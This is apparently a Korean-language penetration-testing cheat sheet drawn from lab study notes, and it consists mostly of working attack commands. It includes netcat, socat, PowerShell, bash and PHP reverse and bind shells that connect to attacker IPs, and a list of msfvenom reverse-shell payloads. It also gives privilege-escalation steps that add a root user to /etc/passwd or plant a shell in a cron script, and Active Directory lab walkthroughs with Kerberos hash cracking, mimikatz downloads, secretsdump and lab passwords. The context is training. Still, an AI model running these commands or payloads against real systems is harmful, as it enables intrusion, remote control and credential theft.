# penetration_test

<details><summary>default</summary>
<p>

```ruby
  
```

</p>

</details>

<!-- ################################################################################################################################################# -->

<details><summary>enumeration</summary>
<p>


```ruby
포트(port scan)
ports=$(nmap -p- --min-rate=1000 -T4 10.11.1.231 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 
nmap -p$ports -sC -sV 10.11.1.231
	
kali@kali:~$ for ip in $(seq  1 255); do nmap -p80 -sS 192.168.133.$ip; done

삼바(smb) enumeration
kali@kali:~$ nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
kali@kali:~$ ls -1 /usr/share/nmap/scripts/smb* 
kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
kali@kali:~$ smbclient -L \\\\10.10.10.175 -N	
kali@kali:~$ smbclient -U '%' -L //10.10.10.100 && smbclient -U 'guest%' -L //
kali@kali:~$ smbmap -u "" -p "" -P 445 -H 10.10.10.100 && smbmap -u "guest" -p "" -P 445 -H 10.10.10.100

kali@kali:~$ smbclient //10.10.10.100/Replication
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
	
웹(web enum)
dirbuster
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.175/FUZZ	
gobuster dir -u http://10.11.1.237/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	
dirb http://10.11.1.237
	
nfs
kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72	
	
enum4linux

robots.txt, sitemap.xml, 소스코드, 헤더, 관리자 페이지 확인 등

nikto
	
```

</p>

</details>

<!-- ################################################################################################################################################# -->


<details><summary>파일 다운로드</summary>
<p>

```ruby
  파일 다운로드
  wget -O report_wget.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
  curl -o report.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
  axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf

```

</p>

</details>
<!-- ################################################################################################################################################# -->

<details><summary>넷캣 쉘</summary>
<p>
<table>
	<th>이름</th>
	<th>설명</th>
	<th>예시</th>
	<tr>
	    <td>바인드 쉘 (nc)</td>
	    <td>bind shell : 공격자가 타겟 서버에 접속<br>
			피해 서버에서 nc -nlvp 5555 -e /bin/bash 가 실행중일 때 (리스닝 상태)<br>
			공격 서버에서 nc -nv 피해서버IP 5555
	    </td>
	    <td>cmd.php?cmd=nc -nlvp 5555 -e /bin/bash    (웹쉘로 타겟서버에서 실행)<br>
			kali # nc -nv 타겟서버ip  (공격자 커맨드에서 실행)<br>
	   </td>
	</tr>
	<tr>
	    <td>리버스 쉘 (nc)</td>
	    <td>reverse shell : 타겟 서버가 공격자에 접속<br>
			공격 서버에서 nc -nlvp 5555 로 리스닝<br>
			피해 서버에서 공격 서버에 연결 
	    </td>
	    <td>cmd.php?cmd=nc -nv 공격자서버ip 5555  -e /bin/bash (웹쉘로 타겟서버에서 실행)<br>
			kali # nc -nlvp 5555   (공격자 커맨드에서 실행)<br>
	    </td>
	</tr>
	<tr>
	    <td>파일전송 (nc)
	    </td>
	    <td>nc로 파일 전송 :<br>
			텍스트 전송: <br>
			받는 서버 : <br>
			nc -nvlp 60000 > flag_recive.txt<br>
<br>
			보내는 서버 :<br>
			cat flag.txt | nc -nv 받는서버ip 60000<br>
			---------------------------------------<br>
			실행파일 (tar로 압축해서 보냄) 전송:<br>
			받는 서버<br>
			nc -nvlp 60000 | tar -x <br>
<br>
			보내는 서버<br>
			tar -c flagfile | nc -nv 받는서버ip 60000
		</td>
		<td>-</td>
	</tr>
</table>
</p>

</details>
<!-- ################################################################################################################################################# -->



<details><summary> socat 쉘</summary>
<p>
<table>
	<th>이름</th>
	<th>설명</th>
	<th>예시</th>
	<tr>
	    <td>바인드 쉘 (socat)</td>
	    <td>bind shell : 공격자가 타겟 서버에 접속<br>
			socat encrypt 바인드 쉘 : <br>
			받는 서버 :<br>
			openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt            :key랑 crt 생성<br>
			cat bind_shell.key bind_shell.crt > bind_shell.pem                                               <br>                                                             :key랑 crt를 pem에 저장
			이용해서 ssl pem 파일 생성 <br>
<br>
			리스닝<br>
			sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash<br>
<br>
			공격 서버 :<br>
			socat - OPENSSL:피해IP:443,verify=0<br>
	    </td>
	    <td>
		-
	   </td>
	</tr>
	<tr>
	    <td>리버스 쉘 (socat)</td>
	    <td>socat 리버스쉘 :<br>
			공격 서버 : socat -d -d TCP4-LISTEN:5555 STDOUT <br>
			피해 서버 : socat TCP4:공격자IP:5555 EXEC:/bin/bash <br>
	    </td>
	    <td>
		-
	    </td>
	</tr>
	<tr>
	    <td>파일전송 (socat)
	    </td>
	    <td>socat 파일 전송 :<br>
		보내는 서버 : socat TCP-LISTEN:포트,fork file:pass.txt<br>
		받는 서버 : socat TCP4:보내는서버ip:포트 file:저장할파일명.txt,create<br>
		</td>
		<td>-</td>
	</tr>
</table>
</p>

</details>
<!-- ################################################################################################################################################# -->


<details><summary>파워쉘</summary>
<p>
<table>
	<th>이름</th>
	<th>설명</th>
	<th>예시</th>
	<tr>
	    <td>바인드 쉘 (powershell)</td>
	    <td>파우쉘 바인드쉘
윈도우 서버 :<br>
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',445);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()" <br>
<br>
칼리 서버 :<br> 
nc -nv 윈도우서버IP 바인드포트
	    </td>
	    <td>
		-
	   </td>
	</tr>
	<tr>
	    <td>리버스 쉘 (powershell)</td>
	    <td>파워쉘 리버스쉘<br>
칼리 서버 <br>
nc -nvlp 443<br>
<br>
윈도우 서버<br>
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.220.128',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	    </td>
	    <td>
		-
	    </td>
	</tr>
	<tr>
	    <td>파일전송 (powershell)
	    </td>
	    <td>파워쉘 파일 다운로드<br>
		powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.220.128/wget.exe','C:\Users\mc_vm\get.exe')"

	    </td>
	    <td>-</td>
	</tr>
</table>
</p>

</details>
<!-- ################################################################################################################################################# -->


<details><summary>파워캣</summary>
<p>
파워캣 설치 : 칼리에 파워캣 설치
		apt-get install powercat
		설치 경로 : usr/share/windows-resources/powercat.
<table>
	<th>이름</th>
	<th>설명</th>
	<th>예시</th>
	<tr>
	    <td>바인드 쉘 (powercat)</td>
	    <td>파워캣 바인드쉘 :<br>
powercat -l -p 443 -e cmd.exe<br>
<br>
nc 윈도우ip 443
	    </td>
	    <td>
		-
	   </td>
	</tr>
	<tr>
	    <td>리버스 쉘 (powercat)</td>
	    <td>파워캣 리버스쉘 :<br>
sudo nc -lvp 443<br>
<br>
powercat -c 칼리ip -p 443 -e cmd.exe<br>
</td>
	    <td>
		-
	    </td>
	</tr>
	<tr>
	    <td>파일전송 (powercat)
	    </td>
	    <td>파워캣으로 파일 받기 (윈도우 -> 칼리)<br>
kali@kali:~# nc -lnvp 443 > file_from_window.txt (file_from_window.txt로 저장)<br>
<br>
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\send_file_to_kali.txt (send_file_to_kali.txt파일 전송)<br>
		</td>
		<td>-</td>
	</tr>
</table>
</p>

</details>



<!-- ################################################################################################################################################# -->
<details><summary>파이썬, 배쉬 쉘 얻기</summary>
<p>

```ruby
   파이썬 쉘
   python -c 'import pty; pty.spawn("/bin/bash")'
   python3 -c 'import pty; pty.spawn("/bin/bash")'

   배시 쉘
   /bin/bash -i &> /dev/tcp/10.10.10.10/7777 0>&1
   <?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.221:4444 0>&1"); ?>  : lfi
```

</p>

</details>
<!-- ################################################################################################################################################# -->

<details><summary>MSFVenom Reverse Shell Cheatsheet</summary>
<p>

```ruby
Non-Meterpreter Binaries
Staged Payloads for Windows

x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Stageless Payloads for Windows

x86	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Staged Payloads for Linux

x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
Stageless Payloads for Linux

x86	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

---------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------
	
Non-Meterpreter Web Payloads
asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

---------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------

Meterpreter Binaries
Staged Payloads for Windows

x86	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Stageless Payloads for Windows

x86	msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Staged Payloads for Linux

x86	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
Stageless Payloads for Linux

x86	msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

---------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------
	
Meterpreter Web Payloads
asp	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
php	msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
	
```

</p>

</details>


<!-- ################################################################################################################################################# -->

<details><summary>권한 상승 리눅스</summary>
<p>
	
```ruby
 
---------------------------------스케줄링(crontab, at 등)

루트가 작성한 파일 퍼미션이 잘못 설정되어 있을 경우
ex)
/var/archive/
-rwxr-xr-x  1 root root    312 Jan  5 05:59 archive.sh

kali# cat archive.sh

#!/bin/bash
echo "test"

밑에와 같이 수정

#!/bin/bash
bash -i >$ /dev/tcp/공격자ip(리스너)/4545 0>&1

참조 : https://www.youtube.com/watch?v=ewWBJCd6hRY

-----------------------------------------------------------

***/etc/passwd 


student$ ls -al /etc/passwd                                                                                                                                                            
-rw-rw-rw- 1 root root 1431 Jan  6 22:25 /etc/passwd
일반 사용자 쓰기 권한 있을 경우


student$ openssl passwd -1 -salt stef test123                                                                             
패스워드 해시 결과 : $1$stef$ZYhbekI8UymZof5o8aY3A/


nano /etc/passwd로 
hack 유저 추가 후 저장

student:x:1000:1000::/home/student:/bin/bash
hack:$1$stef$ZYhbekI8UymZof5o8aY3A/:0:0:root:/root:/bin/bash


openssl passwd -1 -salt stef test123 
python3 -c 'import crypt; print(crypt.crypt(['test123'], "$6$[stef]"))'

패스워드 해시 참조 문서
https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/


python3 -m http.server -bind 127.0.0.1 9000


쓰기 가능한 디렉터리 목록 
student@debian:~$ find / -writable -type d 2>/dev/null



suid 붙은 파일들 찾기
student@debian:~$ find / -perm -u=s -type f 2>/dev/null

참조문서
https://gtfobins.github.io/
	
```

</p>

</details>
<!-- ################################################################################################################################################# -->



<details><summary>액티브 디렉터리</summary>
<p>

```ruby
 
-------------------------------------------------------------------------
ad


try hack me : https://systemweakness.com/active-directory-attack-cheat-sheet-ea9e9744028d
hack the box : Sauna, Active, monteverde, sizzle, multimaster

***************** lab name : SAUNA
***********************************************************************************************************************

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.175 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.175

apt-get install build-essential python3-dev python2.7-dev libldap2-dev libsasl2-dev slapd ldap-utils tox  lcov valgrind

python3 windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U
또는 ./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U 

python3 GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug

smbclient -L \\\\10.10.10.175 -N

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.175/FUZZ

./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt


while read p; do python3 GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt

for ip in $(cat unames.txt); do python3 GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt

hashcat --help | grep Kerberos

hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force

evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'

-------------------------------------------------------------------------
------------------------------------------------------------------------- get user account and signin

powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.2:8000/winPEASx64.exe','C:\Users\Fsmith\Documents\winPEASx64.exe')
powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.2:8000/mimikatz64.exe .exe','C:\Users\Fsmith\Documents\mimikatz64.exe')

bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All


secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




***************** lab name : Active
***********************************************************************************************************************

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.100 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.100

nmap --script safe -p445 10.10.10.100

smbmap -u "" -p "" -P 445 -H 10.10.10.100 && smbmap -u "guest" -p "" -P 445 -H 10.10.10.100
smbclient -U '%' -L //10.10.10.100 && smbclient -U 'guest%' -L //

nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.100

smbclient //10.10.10.100/Replication

─# smbclient //10.10.10.100/Replication                  
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> mget *
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (8.5 KiloBytes/sec) (average 2.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.6 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.3 KiloBytes/sec) (average 2.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (11.0 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \> 



──(root㉿kali)-[/home/kali/21.Active_directory/active/p]
└─# smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
[+] Starting search for files matching 'Groups.xml' on share Replication.

sudo apt-get install cifs-utils 

```

</p>

</details>
<!-- ################################################################################################################################################# -->


<details><summary>포트 포워딩</summary>
<p>

```ruby

포트포워딩
ssh -f -L 2221:192.168.40.52:1234 kali@192.168.119.140 sleep 10; nc 127.0.0.1 1234


ssh -N -R 192.168.119.164:2221:127.0.0.1:5555 kali@192.168.119.164
ssh -N -R 2221:127.0.0.1:5555 kali@192.168.119.164

ssh -L9999:192.168.119.164:4444 root@192.168.119.164 -N -f
nc -nvp 4444 -e /bin/bash & ss -lt


ssh -R4444:127.0.0.1:5555 kali@192.168.119.164 -fN



ssh -R 5555:127.0.0.1:4444 kali@92.168.119.164


ssh -R 4444:127.0.0.1:5555 kali@192.168.119.164




ssh -N -R 2221:127.0.0.1:5555 kali@192.168.119.164
nc -lp 5555 -s 127.0.0.1 -e /bin/bash 


nc -nlvp 5555 -e /bin/bash 


nc -lp 5555 -s 127.0.0.1 -e /bin/bash

 ssh -N -R 127.0.0.1:5555:192.168.119.164:2221 kali@192.168.119.164
 
 
 ssh -R 192.168.119.164:2221:127.0.0.1:5555 kali@92.168.119.164
 kali 2221 포트를 이용해서 127로 접속
 
 127.0.0.1:5555 -> 192.168.164.33 2221  -----> '
 
 ssh -N -R 2221:127.0.0.1:5555 student@92.168.164.52
 
 ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4


find / -name test* | grep -E '[A-Za-z0-9+/]{4}*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)'
find ./ -type f -exec  grep -H '찾을 내용' {} \;     :현재 파일 내에 특정 단어가 들어간 파일 및 내용 찾기


```

</p>

<p>
  hihi
</p>
</details>
